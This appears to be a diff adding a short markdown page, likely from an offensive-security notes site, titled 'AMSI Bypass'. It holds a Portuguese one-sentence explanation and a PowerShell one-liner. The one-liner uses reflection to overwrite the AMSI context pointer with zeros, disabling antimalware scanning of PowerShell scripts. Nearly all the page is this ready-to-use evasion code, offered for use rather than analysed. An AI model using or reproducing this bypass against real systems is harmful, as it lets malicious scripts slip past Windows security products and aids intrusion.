@@ -1,0 +1,11 @@
+---
+title: "AMSI Bypass"
+---
+
+# AMSI Bypass
+
+One-liner que corrompe o ponteiro de contexto do AMSI via reflexão, desabilitando a varredura de scripts PowerShell sem modificar binários em disco. Funciona sobrescrevendo o buffer do contexto AMSI com um array de zeros.
+
+```powershell
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+```
